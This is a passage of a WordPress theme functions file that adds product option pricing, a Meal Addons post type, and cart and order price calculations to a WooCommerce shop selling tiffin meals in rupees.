                $option_value = isset($_POST['apo_' . $option['id']]) ? $_POST['apo_' . $option['id']] : '';

                if ($option['required'] && empty($option_value)) {
                    wc_add_notice(sprintf(__('%s is a required field.', 'advanced-product-options'), $option['name']), 'error');
                    $passed = false;
                }

                if ($option['type'] === 'date' && !empty($option_value)) {
                    if (!apo_validate_date($option_value)) {
                        wc_add_notice(sprintf(__('%s must be a future date (Monday to Friday).', 'advanced-product-options'), $option['name']), 'error');
                        $passed = false;
                    }
                }
            }
        }
    }

    return $passed;
}
add_filter('woocommerce_add_to_cart_validation', 'apo_add_to_cart_validation', 10, 3);


// Add custom data to cart item
function apo_add_cart_item_data($cart_item_data, $product_id, $variation_id) {
    $option_groups = get_posts(array(
        'post_type' => 'apo_option_group',
        'posts_per_page' => -1,
    ));

    foreach ($option_groups as $group) {
        $selected_products = get_post_meta($group->ID, '_apo_selected_products', true);
        
        // Check if the current product is selected for this option group
        if (is_array($selected_products) && in_array($product_id, $selected_products)) {
            $options = get_post_meta($group->ID, '_apo_options', true);
            foreach ($options as $option) {
                if (isset($_POST['apo_' . $option['id']])) {
                    $cart_item_data['apo_options'][$option['id']] = $_POST['apo_' . $option['id']];
                }
            }
        }
    }

    return $cart_item_data;
}
add_filter('woocommerce_add_cart_item_data', 'apo_add_cart_item_data', 10, 3);

// Add custom options to order item meta
function apo_add_order_item_meta($item, $cart_item_key, $values, $order) {
    if (isset($values['apo_options'])) {
        foreach ($values['apo_options'] as $option_id => $value) {
            $option = apo_get_option_by_id($option_id);
            if ($option) {
                $display_value = is_array($value) ? implode(', ', $value) : $value;

                // Check for both price adjustment and multiplier
                $price_adjustment = 0;
                $multiplier = '';
                
                if (in_array($option['type'], array('radio', 'select', 'image'))) {
                    $choice_key = array_search($value, $option['choices']);
                    if ($choice_key !== false) {
                        if (!empty($option['price_multipliers'][$choice_key])) {
                            $multiplier = $option['price_multipliers'][$choice_key];
                        } else if (isset($option['price_adjustments'][$choice_key])) {
                            $price_adjustment = $option['price_adjustments'][$choice_key];
                        }
                    }
                }

                // Add meta data with appropriate price information
                if ($multiplier) {
                    $item->add_meta_data(
                        $option['name'],
                        $display_value . ' (Ã—' . $multiplier . ')'
                    );
                } else if ($price_adjustment != 0) {
                    $item->add_meta_data(
                        $option['name'],
                        $display_value . ' (' . wc_price($price_adjustment) . ')'
                    );
                } else {
                    $item->add_meta_data($option['name'], $display_value);
                }
            }
        }
    }
}
add_action('woocommerce_checkout_create_order_line_item', 'apo_add_order_item_meta', 10, 4);


// Add this new function to display cart item data
function apo_get_item_data($item_data, $cart_item) {
    if (isset($cart_item['apo_options']) && !empty($cart_item['apo_options'])) {
        foreach ($cart_item['apo_options'] as $option_id => $value) {
            $option = apo_get_option_by_id($option_id);
            if ($option) {
                $display_value = is_array($value) ? implode(', ', $value) : $value;

                // Check for both price adjustment and multiplier
                $price_adjustment = 0;
                $multiplier = '';
                
                if (in_array($option['type'], array('radio', 'select', 'image'))) {
                    $choice_key = array_search($value, $option['choices']);
                    if ($choice_key !== false) {
                        if (!empty($option['price_multipliers'][$choice_key])) {
                            $multiplier = $option['price_multipliers'][$choice_key];
                        } else if (isset($option['price_adjustments'][$choice_key])) {
                            $price_adjustment = $option['price_adjustments'][$choice_key];
                        }
                    }
                }

                // Create display text with appropriate price information
                $display = $display_value;
                if ($multiplier) {
                    $display .= ' (Ã—' . $multiplier . ')';
                } else if ($price_adjustment != 0) {
                    $display .= ' (' . wc_price($price_adjustment) . ')';
                }

                $item_data[] = array(
                    'key'     => $option['name'],
                    'value'   => $display_value,
                    'display' => $display
                );
            }
        }
    }
    return $item_data;
}
add_filter('woocommerce_get_item_data', 'apo_get_item_data', 10, 2);


// Display custom options in order details
function apo_display_order_item_meta($item_id, $item, $order) {
    $meta_data = $item->get_meta_data();
    foreach ($meta_data as $meta) {
        if (strpos($meta->key, 'apo_') === 0) {
            echo '<p><strong>' . esc_html(substr($meta->key, 4)) . ':</strong> ' . esc_html($meta->value) . '</p>';
        }
    }
}
add_action('woocommerce_order_item_meta_end', 'apo_display_order_item_meta', 10, 3);

// Add AJAX handler for updating product price
function apo_update_price() {
    if (!isset($_POST['product_id']) || !isset($_POST['options'])) {
        wp_send_json_error('Invalid request');
    }

    $product_id = intval($_POST['product_id']);
    $product = wc_get_product($product_id);
    $base_price = $product->get_price();

    parse_str($_POST['options'], $options);
    $total_adjustment = 0;
    $total_multiplier = 1;

    $option_groups = get_posts(array(
        'post_type' => 'apo_option_group',
        'posts_per_page' => -1,
    ));

    foreach ($option_groups as $group) {
        $selected_products = get_post_meta($group->ID, '_apo_selected_products', true);
        
        if (is_array($selected_products) && in_array($product_id, $selected_products)) {
            $group_options = get_post_meta($group->ID, '_apo_options', true);
            foreach ($group_options as $option) {
                $option_value = isset($options['apo_' . $option['id']]) ? $options['apo_' . $option['id']] : '';
                if ($option_value) {
                    if (is_array($option_value)) { // For checkboxes
                        foreach ($option_value as $choice) {
                            $choice_key = array_search($choice, $option['choices']);
                            if ($choice_key !== false) {
                                if (!empty($option['price_multipliers'][$choice_key])) {
                                    $total_multiplier *= floatval($option['price_multipliers'][$choice_key]);
                                } else if (isset($option['price_adjustments'][$choice_key])) {
                                    $total_adjustment += floatval($option['price_adjustments'][$choice_key]);
                                }
                            }
                        }
                    } else { // For radio buttons and select
                        $choice_key = array_search($option_value, $option['choices']);
                        if ($choice_key !== false) {
                            if (!empty($option['price_multipliers'][$choice_key])) {
                                $total_multiplier *= floatval($option['price_multipliers'][$choice_key]);
                            } else if (isset($option['price_adjustments'][$choice_key])) {
                                $total_adjustment += floatval($option['price_adjustments'][$choice_key]);
                            }
                        }
                    }
                }
            }
        }
    }

    // Calculate final price: (base_price Ã— multiplier) + adjustments
    $new_price = ($base_price * $total_multiplier) + $total_adjustment;
    $price_html = wc_price($new_price);

    wp_send_json_success(array('price' => $new_price, 'price_html' => $price_html));
}
add_action('wp_ajax_apo_update_price', 'apo_update_price');
add_action('wp_ajax_nopriv_apo_update_price', 'apo_update_price');

// Add price adjustment to cart item
function apo_add_price_adjustment($cart_object) {
    if (is_admin() && !defined('DOING_AJAX')) {
        return;
    }

    foreach ($cart_object->get_cart() as $cart_item_key => $cart_item) {
        if (isset($cart_item['apo_options'])) {
            $product = $cart_item['data'];
            
            // Always use the original product price, not the cart item's potentially modified price
            $original_product = wc_get_product($product->get_id());
            $base_price = $original_product->get_price();
            
            // Check if we already stored the original price to prevent multiple adjustments
            if (!isset($cart_item['original_price_stored'])) {
                // Store the original price in the cart item to prevent multiple adjustments
                WC()->cart->cart_contents[$cart_item_key]['original_price_stored'] = true;
                WC()->cart->cart_contents[$cart_item_key]['original_base_price'] = $base_price;
            } else {
                // Use the stored original price
                $base_price = $cart_item['original_base_price'];
            }
            
            $total_adjustment = 0;
            $total_multiplier = 1;

            foreach ($cart_item['apo_options'] as $option_id => $value) {
                $option = apo_get_option_by_id($option_id);
                if ($option) {
                    if (is_array($value)) { // For checkboxes
                        foreach ($value as $choice) {
                            $choice_key = array_search($choice, $option['choices']);
                            if ($choice_key !== false) {
                                if (!empty($option['price_multipliers'][$choice_key])) {
                                    $total_multiplier *= floatval($option['price_multipliers'][$choice_key]);
                                } else {
                                    $total_adjustment += floatval($option['price_adjustments'][$choice_key]);
                                }
                            }
                        }
                    } else { // For radio buttons and select
                        $choice_key = array_search($value, $option['choices']);
                        if ($choice_key !== false) {
                            if (!empty($option['price_multipliers'][$choice_key])) {
                                $total_multiplier *= floatval($option['price_multipliers'][$choice_key]);
                            } else {
                                $total_adjustment += floatval($option['price_adjustments'][$choice_key]);
                            }
                        }
                    }
                }
            }

            // Apply both multiplier and additions
            $new_price = ($base_price * $total_multiplier) + $total_adjustment;
            $cart_item['data']->set_price($new_price);
        }
    }
}
add_action('woocommerce_before_calculate_totals', 'apo_add_price_adjustment', 10, 1);

// Add new function to update order item price
function apo_update_order_item_price($item, $cart_item_key, $values, $order) {
    if (isset($values['apo_options'])) {
        $product = $item->get_product();
        $base_price = $product->get_price('edit'); 
        $quantity = $item->get_quantity(); // Get the actual quantity from the order item
        $total_adjustment = 0;
        $total_multiplier = 1; // Initialize multiplier

        // Handle APO options with both adjustments and multipliers
        foreach ($values['apo_options'] as $option_id => $value) {
            $option = apo_get_option_by_id($option_id);
            if ($option) {
                if (is_array($value)) { // For checkboxes
                    foreach ($value as $choice) {
                        $choice_key = array_search($choice, $option['choices']);
                        if ($choice_key !== false) {
                            if (!empty($option['price_multipliers'][$choice_key])) {
                                $total_multiplier *= floatval($option['price_multipliers'][$choice_key]);
                            } else if (isset($option['price_adjustments'][$choice_key])) {
                                $total_adjustment += floatval($option['price_adjustments'][$choice_key]);
                            }
                        }
                    }
                } else { // For radio buttons and select
                    $choice_key = array_search($value, $option['choices']);
                    if ($choice_key !== false) {
                        if (!empty($option['price_multipliers'][$choice_key])) {
                            $total_multiplier *= floatval($option['price_multipliers'][$choice_key]);
                        } else if (isset($option['price_adjustments'][$choice_key])) {
                            $total_adjustment += floatval($option['price_adjustments'][$choice_key]);
                        }
                    }
                }
            }
        }

        $addon_total_per_item = 0;
        // Handle meal addons - calculate addon cost per item
        if (isset($values['meal_addons'])) {
            $meal_addons = $values['meal_addons'];
            $num_tiffins = isset($values['number_of_tiffins']) ? (int) $values['number_of_tiffins'] : 1;
            
            foreach ($meal_addons as $addon) {
                $price_per_unit = floatval(get_post_meta($addon['id'], '_addon_price', true));
                $addon_quantity = intval($addon['quantity']);
                // Calculate addon cost per order item (this will be multiplied by quantity later)
                $addon_total_per_item += ($price_per_unit * $addon_quantity * $num_tiffins);
            }
        }

        // Calculate price per unit: (base_price Ã— multiplier) + adjustments + addons_per_item
        $price_per_unit = ($base_price * $total_multiplier) + $total_adjustment + $addon_total_per_item;
        
        // Calculate subtotal for the line (per unit price Ã— quantity)
        $calculated_subtotal = $price_per_unit * $quantity;
        
        // IMPORTANT: Check if a discount has been applied
        // Get the line subtotal and total from cart values
        $line_subtotal = isset($values['line_subtotal']) ? $values['line_subtotal'] : 0;
        $line_total = isset($values['line_total']) ? $values['line_total'] : 0;
        
        // Calculate discount ratio (if any) from the existing cart values
        $discount_ratio = 1; // Default: no discount
        if ($line_subtotal > 0 && $line_total < $line_subtotal) {
            // There is a discount applied
            $discount_ratio = $line_total / $line_subtotal;
        }
        
        // Apply the same discount ratio to our calculated subtotal
        $final_total = round($calculated_subtotal * $discount_ratio, 2);
        
        // Set both subtotal (pre-discount amount) and total (post-discount amount)
        $item->set_subtotal($calculated_subtotal);
        $item->set_total($final_total);
        
        // Optional: Add debug logging
        error_log("APO Debug - Order Item Price Calculation:");
        error_log("  Base price per unit: {$base_price}");
        error_log("  Multiplier: {$total_multiplier}");
        error_log("  Adjustment: {$total_adjustment}");
        error_log("  Addon per item: {$addon_total_per_item}");
        error_log("  Final price per unit: {$price_per_unit}");
        error_log("  Quantity: {$quantity}");
        error_log("  Calculated subtotal: {$calculated_subtotal}");
        error_log("  Final total: {$final_total}");
    }
}
add_action('woocommerce_checkout_create_order_line_item', 'apo_update_order_item_price', 5, 4);

// Helper function to get option by ID
function apo_get_option_by_id($option_id) {
    $option_groups = get_posts(array(
        'post_type' => 'apo_option_group',
        'posts_per_page' => -1,
    ));

    foreach ($option_groups as $group) {
        $options = get_post_meta($group->ID, '_apo_options', true);
        foreach ($options as $option) {
            if ($option['id'] == $option_id) {
                return $option;
            }
        }
    }

    return false;
}

// Add a safer debug function
function apo_safe_debug_log($message) {
    if (defined('WP_DEBUG') && WP_DEBUG === true) {
        error_log('APO Debug: ' . $message);
    }
}

// Modify the existing functions to use the new debug function
add_action('woocommerce_before_single_product', function() {
    apo_safe_debug_log('Single product template loaded');
});


function custom_admin_background() {
    echo '<style>
        // #wpbody-content { background-color: #2C3338 !important; text-color: #white !important; }
        // #wpcontent { background-color: #2C3338 !important; }
        // #adminmenu { background-color: #333333 !important; }
        // #wpadminbar { background-color: #222222 !important; }
    </style>';
}
add_action('admin_head', 'custom_admin_background');

// Register Meal Addons Custom Post Type
function register_meal_addons_post_type() {
    $labels = array(
        'name'               => 'Meal Addons',
        'singular_name'      => 'Meal Addon',
        'menu_name'          => 'Meal Addons',
        'add_new'           => 'Add New',
        'add_new_item'      => 'Add New Meal Addon',
        'edit_item'         => 'Edit Meal Addon',
        'new_item'          => 'New Meal Addon',
        'view_item'         => 'View Meal Addon',
        'search_items'      => 'Search Meal Addons',
        'not_found'         => 'No meal addons found',
        'not_found_in_trash'=> 'No meal addons found in trash'
    );

    $args = array(
        'labels'              => $labels,
        'public'              => false,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'capability_type'     => 'post',
        'hierarchical'        => false,
        'rewrite'             => array('slug' => 'meal-addon'),
        'supports'            => array('title'),
        'menu_icon'           => 'dashicons-plus',
        'show_in_rest'        => true
    );

    register_post_type('meal_addon', $args);
}
add_action('init', 'register_meal_addons_post_type');

// Add Meta Box for Meal Addon Details
function add_meal_addon_meta_boxes() {
    add_meta_box(
        'meal_addon_details',
        'Meal Addon Details',
        'render_meal_addon_meta_box',
        'meal_addon',
        'normal',
        'high'
    );
}
add_action('add_meta_boxes', 'add_meal_addon_meta_boxes');

// Render Meta Box Content
function render_meal_addon_meta_box($post) {
    // Add nonce for security
    wp_nonce_field('meal_addon_meta_box', 'meal_addon_meta_box_nonce');

    // Get existing values
    $price = get_post_meta($post->ID, '_addon_price', true);
    $max_quantity = get_post_meta($post->ID, '_max_quantity', true);
    $status = get_post_meta($post->ID, '_addon_status', true);

    ?>
    <div class="meal-addon-meta-box">
        <p>
            <label for="addon_price">Price per Unit (â‚¹):</label>
            <input type="number" 
                   id="addon_price" 
                   name="addon_price" 
                   value="<?php echo esc_attr($price); ?>" 
                   step="0.01" 
                   min="0"
                   required>
        </p>
        <p>
            <label for="max_quantity">Maximum Quantity per Tiffin:</label>
            <input type="number" 
                   id="max_quantity" 
                   name="max_quantity" 
                   value="<?php echo esc_attr($max_quantity); ?>" 
                   min="1"
                   required>
        </p>
        <p>
            <label for="addon_status">Status:</label>
            <select id="addon_status" name="addon_status">
                <option value="active" <?php selected($status, 'active'); ?>>Active</option>
                <option value="inactive" <?php selected($status, 'inactive'); ?>>Inactive</option>
            </select>
        </p>
    </div>
    <style>
        .meal-addon-meta-box label {
            display: inline-block;
            width: 150px;
            font-weight: bold;
        }
        .meal-addon-meta-box input,
        .meal-addon-meta-box select {
            width: 200px;
        }
        .meal-addon-meta-box p {
            margin: 15px 0;
        }
    </style>
    <?php
}

// Save Meta Box Data
function save_meal_addon_meta_box($post_id) {
    // Check if our nonce is set and verify it
    if (!isset($_POST['meal_addon_meta_box_nonce']) || 
        !wp_verify_nonce($_POST['meal_addon_meta_box_nonce'], 'meal_addon_meta_box')) {
        return;
    }

    // If this is an autosave, don't do anything
    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }

    // Check the user's permissions
    if (!current_user_can('edit_post', $post_id)) {
        return;
    }

    // Save the data
    if (isset($_POST['addon_price'])) {
        update_post_meta($post_id, '_addon_price', 
            sanitize_text_field($_POST['addon_price']));
    }

    if (isset($_POST['max_quantity'])) {
        update_post_meta($post_id, '_max_quantity', 
            sanitize_text_field($_POST['max_quantity']));
    }

    if (isset($_POST['addon_status'])) {
        update_post_meta($post_id, '_addon_status', 
            sanitize_text_field($_POST['addon_status']));
    }
}
add_action('save_post_meal_addon', 'save_meal_addon_meta_box');

// Helper function to get all active meal addons
function get_active_meal_addons() {
    $args = array(
        'post_type' => 'meal_addon',
        'posts_per_page' => -1,
        'meta_query' => array(
            array(
                'key' => '_addon_status',
                'value' => 'active',
                'compare' => '='
            )
        )
    );

    $addons = get_posts($args);
    $formatted_addons = array();

    foreach ($addons as $addon) {
        $formatted_addons[] = array(
            'id' => $addon->ID,
            'name' => $addon->post_title,
            'price' => get_post_meta($addon->ID, '_addon_price', true),
            'max_quantity' => get_post_meta($addon->ID, '_max_quantity', true)
        );
    }

    return $formatted_addons;
}

// Add REST API endpoint for meal addons
function register_meal_addons_api_routes() {
    register_rest_route('apo/v1', '/meal-addons', array(
        'methods' => 'GET',
        'callback' => 'get_meal_addons_api',
        'permission_callback' => '__return_true'
    ));
}
add_action('rest_api_init', 'register_meal_addons_api_routes');

function get_meal_addons_api() {
    return rest_ensure_response(get_active_meal_addons());
}

// Add Product Meta Box for Meal Addons
function add_product_meal_addons_meta_box() {
    add_meta_box(
        'product_meal_addons',
        'Meal Addons Settings',
        'render_product_meal_addons_meta_box',
        'product',
        'normal',
        'high'
    );
}
add_action('add_meta_boxes', 'add_product_meal_addons_meta_box');

// Render Product Meta Box Content
function render_product_meal_addons_meta_box($post) {
    wp_nonce_field('product_meal_addons_meta_box', 'product_meal_addons_meta_box_nonce');

    $enabled = get_post_meta($post->ID, '_meal_addons_enabled', true);
    $selected_addons = get_post_meta($post->ID, '_selected_meal_addons', true);
    if (!is_array($selected_addons)) {
        $selected_addons = array();
    }

    $all_addons = get_active_meal_addons();
    ?>
    <div class="meal-addons-product-settings">
        <p>
            <label>
                <input type="checkbox" 
                       name="meal_addons_enabled" 
                       value="yes" 
                       <?php checked($enabled, 'yes'); ?>>
                Enable Meal Addons for this product
            </label>
        </p>
        
        <div class="available-addons" style="margin-top: 15px;">
            <h4>Available Addons:</h4>
            <?php foreach ($all_addons as $addon) : ?>
                <p>
                    <label>
                        <input type="checkbox" 
                               name="selected_meal_addons[]" 
                               value="<?php echo esc_attr($addon['id']); ?>"
                               <?php checked(in_array($addon['id'], $selected_addons)); ?>>
                        <?php echo esc_html($addon['name']); ?> 
                        (â‚¹<?php echo esc_html($addon['price']); ?> per unit)
                    </label>
                </p>
            <?php endforeach; ?>
        </div>
    </div>
    <?php
}

// Save Product Meta Box Data
function save_product_meal_addons_meta_box($post_id) {
    if (!isset($_POST['product_meal_addons_meta_box_nonce']) || 
        !wp_verify_nonce($_POST['product_meal_addons_meta_box_nonce'], 'product_meal_addons_meta_box')) {
        return;
    }

    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }

    if (!current_user_can('edit_post', $post_id)) {
        return;
    }

    // Save enabled status
    $enabled = isset($_POST['meal_addons_enabled']) ? 'yes' : 'no';
    update_post_meta($post_id, '_meal_addons_enabled', $enabled);

    // Save selected addons
    $selected_addons = isset($_POST['selected_meal_addons']) ? 
        array_map('sanitize_text_field', $_POST['selected_meal_addons']) : array();
    update_post_meta($post_id, '_selected_meal_addons', $selected_addons);
}
add_action('save_post_product', 'save_product_meal_addons_meta_box');

// Add WooCommerce support
function apo_add_woocommerce_support() {
    add_theme_support('woocommerce');
}
add_action('after_setup_theme', 'apo_add_woocommerce_support');

// Enqueue scripts and styles for the modal
function apo_enqueue_modal_assets() {
    if (is_product()) {
        wp_enqueue_style(
            'apo-styles',
            get_stylesheet_directory_uri() . '/css/apo-styles.css',
            array(),
            '1.0.0'
        );

        wp_enqueue_script(
            'apo-scripts',
            get_stylesheet_directory_uri() . '/js/apo-scripts.js',
            array('jquery'),
            '1.0.0',
            true
        );

        // Add localized script data
        wp_localize_script('apo-scripts', 'apoData', array(
            'ajaxurl' => admin_url('admin-ajax.php'),
            'nonce' => wp_create_nonce('apo_nonce'),
            'currencySymbol' => get_woocommerce_currency_symbol(),
            'currencyPosition' => get_option('woocommerce_currency_pos'),
            'thousandSeparator' => wc_get_price_thousand_separator(),
            'decimalSeparator' => wc_get_price_decimal_separator(),
            'numDecimals' => wc_get_price_decimals()
        ));
    }
}
add_action('wp_enqueue_scripts', 'apo_enqueue_modal_assets');


// Add meal addons to cart item data
function add_meal_addons_to_cart_item_data($cart_item_data, $product_id) {
    if (isset($_POST['selected_meal_addons'])) {
        $selected_addons = json_decode(stripslashes($_POST['selected_meal_addons']), true);
        if (is_array($selected_addons)) {
            $cart_item_data['meal_addons'] = $selected_addons;
        }
    }
    return $cart_item_data;
}
add_filter('woocommerce_add_cart_item_data', 'add_meal_addons_to_cart_item_data', 10, 2);

// Calculate addon prices for cart
function calculate_meal_addons_price($cart_item_data, $product_id) {
    if (isset($cart_item_data['meal_addons'])) {
        $addons = $cart_item_data['meal_addons'];
        
        // Get number of tiffins
        $num_tiffins = 1; // Default value
        foreach ($cart_item_data as $key => $value) {
            if (stripos($key, 'number_of_tiffins') !== false) {
                $num_tiffins = intval($value);
                break;
            }
        }
        
        error_log('Number of Tiffins: ' . $num_tiffins);
        
        $addon_total = 0;
        foreach ($addons as $addon) {
            $price_per_unit = floatval(get_post_meta($addon['id'], '_addon_price', true));
            $quantity = intval($addon['quantity']);
            
            // Calculate total for this addon: price per unit Ã— quantity Ã— number of tiffins
            $addon_total += ($price_per_unit * $quantity * $num_tiffins);
            
            error_log(sprintf(
                'Addon calculation: Price per unit: %s Ã— Quantity: %s Ã— Tiffins: %s = %s',
                $price_per_unit,
                $quantity,
                $num_tiffins,
                ($price_per_unit * $quantity * $num_tiffins)
            ));
        }
        
        $cart_item_data['addon_total'] = $addon_total;
    }
    return $cart_item_data;
}
add_filter('woocommerce_add_cart_item', 'calculate_meal_addons_price', 10, 2);

// Display meal addons in cart with proper price calculation
function display_meal_addons_in_cart($item_data, $cart_item) {
    if (isset($cart_item['meal_addons'])) {
        // Get number of tiffins
        $num_tiffins = 1;
        foreach ($cart_item as $key => $value) {
            if (stripos($key, 'number_of_tiffins') !== false) {
                $num_tiffins = intval($value);
                break;
            }
        }
        
        foreach ($cart_item['meal_addons'] as $addon) {
            $addon_post = get_post($addon['id']);
            $price_per_unit = floatval(get_post_meta($addon['id'], '_addon_price', true));
            $quantity = intval($addon['quantity']);
            
            // Calculate total for this addon
            $addon_total = $price_per_unit * $quantity * $num_tiffins;
            
            $item_data[] = array(
                'key' => $addon_post->post_title,
                'value' => sprintf(
                    '%d Ã— %s = %s (for %d tiffins)', 
                    $quantity, 
                    wc_price($price_per_unit),
                    wc_price($addon_total),
                    $num_tiffins
                )
            );
        }
    }
    return $item_data;
}
add_filter('woocommerce_get_item_data', 'display_meal_addons_in_cart', 10, 2);

// Add addon prices to cart total
function add_meal_addons_to_cart_total($cart_object) {
    if (!WC()->session->__isset("reload_checkout")) {
        foreach ($cart_object->cart_contents as $key => $value) {
            if (isset($value['addon_total'])) {
                // Always use the original product price, not the potentially modified cart item price
                $original_product = wc_get_product($value['data']->get_id());
                $original_price = $original_product->get_price();
                
                // Check if we already stored the original price for meal addons
                if (!isset($value['addon_original_price_stored'])) {
                    // Store the original price to prevent multiple addon adjustments
                    WC()->cart->cart_contents[$key]['addon_original_price_stored'] = true;
                    WC()->cart->cart_contents[$key]['addon_original_base_price'] = $original_price;
                } else {
                    // Use the stored original price
                    $original_price = $value['addon_original_base_price'];
                }
                
                $addon_total = floatval($value['addon_total']);
                
                error_log(sprintf(
                    'Setting cart price: Original: %s + Addon Total: %s = %s',
                    $original_price,
                    $addon_total,
                    ($original_price + $addon_total)
                ));
                
                $value['data']->set_price($original_price + $addon_total);
            }
        }
    }
}
add_action('woocommerce_before_calculate_totals', 'add_meal_addons_to_cart_total', 10, 1);

// Clear price adjustment flags when cart items are removed
function clear_price_adjustment_flags_on_remove($cart_item_key) {
    // Flags will be automatically cleared when item is removed from cart
    // This hook ensures proper cleanup
}
add_action('woocommerce_cart_item_removed', 'clear_price_adjustment_flags_on_remove');

// Clear all price adjustment flags when cart is emptied
function clear_all_price_adjustment_flags() {
    // Flags will be automatically cleared when cart is emptied
    // This hook ensures proper cleanup
}
add_action('woocommerce_cart_emptied', 'clear_all_price_adjustment_flags');

// Unified price calculation function to handle both APO options and meal addons
function unified_cart_price_calculation($cart_object) {
    if (is_admin() && !defined('DOING_AJAX')) {
        return;
    }
    
    // Skip during actual order processing to prevent conflicts with order creation
    // but allow during checkout display
    if (doing_action('woocommerce_checkout_process') || doing_action('woocommerce_checkout_create_order')) {
        return;
    }
    
    // Prevent multiple calculations during the same request
    static $calculation_in_progress = false;
    if ($calculation_in_progress) {
        error_log('APO Debug: Price calculation already in progress, skipping...');
        return;
    }
    $calculation_in_progress = true;

    error_log('APO Debug: Starting unified price calculation...');

    foreach ($cart_object->get_cart() as $cart_item_key => $cart_item) {
        $product = $cart_item['data'];
        
        // Always use the original product price
        $original_product = wc_get_product($product->get_id());
        $base_price = $original_product->get_price();
        
        // Check if we already calculated for this cart item in this session
        if (!isset($cart_item['price_calculated_flag'])) {
            WC()->cart->cart_contents[$cart_item_key]['price_calculated_flag'] = true;
            WC()->cart->cart_contents[$cart_item_key]['original_base_price'] = $base_price;
            error_log("APO Debug: Setting original price for item {$cart_item_key}: {$base_price}");
        } else {
            // Use stored original price
            $base_price = $cart_item['original_base_price'];
            error_log("APO Debug: Using stored original price for item {$cart_item_key}: {$base_price}");
        }
        
        $final_price = $base_price;
        
        // Handle APO options
        if (isset($cart_item['apo_options'])) {
            $total_adjustment = 0;
            $total_multiplier = 1;

            foreach ($cart_item['apo_options'] as $option_id => $value) {
                $option = apo_get_option_by_id($option_id);
                if ($option) {
                    if (is_array($value)) { // For checkboxes
                        foreach ($value as $choice) {
                            $choice_key = array_search($choice, $option['choices']);
                            if ($choice_key !== false) {
                                if (!empty($option['price_multipliers'][$choice_key])) {
                                    $total_multiplier *= floatval($option['price_multipliers'][$choice_key]);
                                } else {
                                    $total_adjustment += floatval($option['price_adjustments'][$choice_key]);
                                }
                            }
                        }
                    } else { // For radio buttons and select
                        $choice_key = array_search($value, $option['choices']);
                        if ($choice_key !== false) {
                            if (!empty($option['price_multipliers'][$choice_key])) {
                                $total_multiplier *= floatval($option['price_multipliers'][$choice_key]);
                            } else {
                                $total_adjustment += floatval($option['price_adjustments'][$choice_key]);
                            }
                        }
                    }
                }
            }

            // Apply multiplier and adjustments
            $final_price = ($base_price * $total_multiplier) + $total_adjustment;
            error_log("APO Debug: APO calculation for item {$cart_item_key}: base({$base_price}) Ã— multiplier({$total_multiplier}) + adjustment({$total_adjustment}) = {$final_price}");
        }
        
        // Handle meal addons
        if (isset($cart_item['addon_total'])) {
            $addon_total = floatval($cart_item['addon_total']);
            $final_price += $addon_total;
            error_log("APO Debug: Adding meal addons for item {$cart_item_key}: {$addon_total}, final price: {$final_price}");
        }
        
        // Set the final calculated price
        error_log("APO Debug: Setting final price for item {$cart_item_key}: {$final_price}");
        $cart_item['data']->set_price($final_price);
    }
    
    $calculation_in_progress = false;
    error_log('APO Debug: Unified price calculation completed.');
}
// Use a higher priority to ensure this runs after other calculations
add_action('woocommerce_before_calculate_totals', 'unified_cart_price_calculation', 20, 1);

// Remove the individual calculation functions to prevent conflicts
remove_action('woocommerce_before_calculate_totals', 'apo_add_price_adjustment', 10);
remove_action('woocommerce_before_calculate_totals', 'add_meal_addons_to_cart_total', 10);

// Clear price calculation flags on important cart events
function clear_price_calculation_flags() {
    if (WC()->cart && !WC()->cart->is_empty()) {
        foreach (WC()->cart->get_cart() as $cart_item_key => $cart_item) {
            if (isset(WC()->cart->cart_contents[$cart_item_key]['price_calculated_flag'])) {
                unset(WC()->cart->cart_contents[$cart_item_key]['price_calculated_flag']);
            }
            if (isset(WC()->cart->cart_contents[$cart_item_key]['original_price_stored'])) {
                unset(WC()->cart->cart_contents[$cart_item_key]['original_price_stored']);
            }
            if (isset(WC()->cart->cart_contents[$cart_item_key]['addon_original_price_stored'])) {
                unset(WC()->cart->cart_contents[$cart_item_key]['addon_original_price_stored']);
            }
        }
    }
}

// Clear flags when coupons are applied or removed
add_action('woocommerce_applied_coupon', 'clear_price_calculation_flags');
add_action('woocommerce_removed_coupon', 'clear_price_calculation_flags');

// Clear flags when cart quantities are updated
add_action('woocommerce_after_cart_item_quantity_update', 'clear_price_calculation_flags');

// Clear flags when checkout validation fails (like invalid coupons)
add_action('woocommerce_checkout_process', 'clear_price_calculation_flags', 5);

// Add this new function to capture the number of tiffins when adding to cart
function add_number_of_tiffins_to_cart($cart_item_data, $product_id) {
    if (isset($_POST['number_of_tiffins'])) {
        $cart_item_data['number_of_tiffins'] = intval($_POST['number_of_tiffins']);
    }
    return $cart_item_data;
}
add_filter('woocommerce_add_cart_item_data', 'add_number_of_tiffins_to_cart', 10, 2);

// Add modal HTML to product page
function add_meal_addons_modal() {
    if (!is_product()) return;
    
    global $product;
    $enabled = get_post_meta($product->get_id(), '_meal_addons_enabled', true);
    
    if ($enabled !== 'yes') return;
    
    ?>
    <div id="meal-addons-modal" class="apo-modal" style="display: none;">
        <div class="apo-modal-content">
            <div class="apo-modal-header">
                <h3>Add Meal Add-ons</h3>
                <button class="modal-close">&times;</button>
            </div>
            <div class="apo-modal-body">
                <div id="meal-addons-list"></div>
            </div>
            <div class="apo-modal-footer">
                <div class="addon-total">
                    Total Add-ons: <span class="addon-price">â‚¹0.00</span>
                </div>
                <button class="apply-addons-button">Apply Add-ons</button>
            </div>
        </div>
    </div>
    <button type="button" id="meal-addons-trigger" style="display: none;">
        Add Meal Add-ons
    </button>
    <?php
}
add_action('woocommerce_after_add_to_cart_button', 'add_meal_addons_modal');


/**
 * Add meal addon metadata (e.g., "Extra Roti = 1") to WooCommerce order items.
 */
function add_meal_addons_order_item_meta($item, $cart_item_key, $values, $order) {
    // Only proceed if meal_addons exist
    if (isset($values['meal_addons']) && is_array($values['meal_addons'])) {
        foreach ($values['meal_addons'] as $addon) {
            // Get the actual WP Post for the addon's title
            $addon_post = get_post($addon['id']);
            if ($addon_post) {
                $addon_name = $addon_post->post_title;
                $quantity   = intval($addon['quantity']);
                
                // Example:
                //   Meta name:  "Add-ons"
                //   Meta value: "Extra roti = 1"
                $item->add_meta_data(
                    'Add-ons',
                    sprintf('%s = %d', $addon_name, $quantity)
                );
            }
        }
    }
}
add_action('woocommerce_checkout_create_order_line_item', 'add_meal_addons_order_item_meta', 20, 4);




// Initialize the delivery history display
